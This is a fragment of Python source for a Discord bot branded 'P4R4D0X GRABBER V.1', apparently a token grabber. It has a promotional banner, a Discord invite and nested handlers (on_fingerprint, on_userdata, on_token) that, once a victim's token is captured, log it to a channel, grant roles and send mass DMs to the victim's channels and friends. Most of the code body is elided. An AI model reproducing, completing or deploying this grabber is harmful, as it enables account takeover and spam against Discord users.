...
def bot_title():
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW(f"[P4R4D0X GRABBER V.1], [MADE BY P4R4D0X#5353]")
    print(f"""\n\n{Fore.RESET}██████╗ ██╗  ██╗██████╗ ██╗  ██╗██████╗  ██████╗ ██╗  ██╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██║  ██║██╔══██╗██║  ██║██╔══██╗██╔═████╗╚██╗██╔╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
██████╔╝███████║██████╔╝███████║██║  ██║██║██╔██║ ╚███╔╝     ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
██╔═══╝ ╚════██║██╔══██╗╚════██║██║  ██║████╔╝██║ ██╔██╗     ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
...
╚═╝          ╚═╝╚═╝  ╚═╝     ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
                            ...
                            MADE BY P4R4D0X#5353
                            SCAMER GETS SCAMMED?
                            """.replace('█', f'{b}█{y}'))
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n{w}?[MADE BY https://discord.gg/KqFDZy4HaS] [MAKE BY P4R4D0X#5353]\n{y}------------------------------------------------------------------------------------------------------------------------\n""".replace('|', f'{b}|{w}'))
...
bot = commands.Bot(command_prefix=prefix, description="[P4R4D0X GRABBER V.1], [MADE BY P4R4D0X#5353]", intents=intents)
        ...
        async def on_fingerprint(data):
            ...
            async def on_userdata(user):
                ...
                async def on_token(token):
                    ...
                    if logs_channel:
                        embed_user.set_footer(text="MADE BY P4R4D0X#5353  ・  P4R4D0X GRABBER V.1")
                    ...
                    if give_role == True:
                        try:
                            ...
                            if logs_channel:
                                ...
                                embed_role.set_footer(text="MADE BY P4R4D0X#5353  ・  P4R4D0X GRABBER V.1")
                    ...
                    if mass_dm == 1 or mass_dm == 3:
                        try:
                            ...
                            if logs_channel:
                                ...
                                embed_cdm.set_footer(text="MADE BY P4R4D0X#5353  ・  P4R4D0X GRABBER V.1")
                    ...
                    if mass_dm == 2 or mass_dm == 3:
                        try:
                            ...
                            if logs_channel:
                                ...
                                embed_fdm.set_footer(text="MADE BY P4R4D0X#5353  ・  P4R4D0X GRABBER V.1")
